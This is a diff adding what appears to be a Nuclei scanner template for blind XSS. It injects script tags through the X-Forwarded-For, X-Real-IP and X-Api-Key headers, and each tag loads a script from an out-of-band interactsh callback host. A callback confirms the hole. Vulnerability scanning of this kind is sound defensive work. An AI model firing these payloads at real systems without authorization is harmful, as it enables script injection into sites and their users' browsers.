@@ -1,0 +1,24 @@
+id: blind-xss-custom-headers
+info:
+  name: Blind XSS in Custom Headers
+  author: WhiteFatalis
+  severity: high
+  description: Injects blind XSS payloads into common custom headers like X-Forwarded-For, X-API-Key, etc.
+  tags: xss, blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      X-Forwarded-For: "\"><script src=//{{interactsh-url}}></script>"
+      X-Real-IP: "\"><script src=//{{interactsh-url}}></script>"
+      X-Api-Key: "\"><script src=//{{interactsh-url}}></script>"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
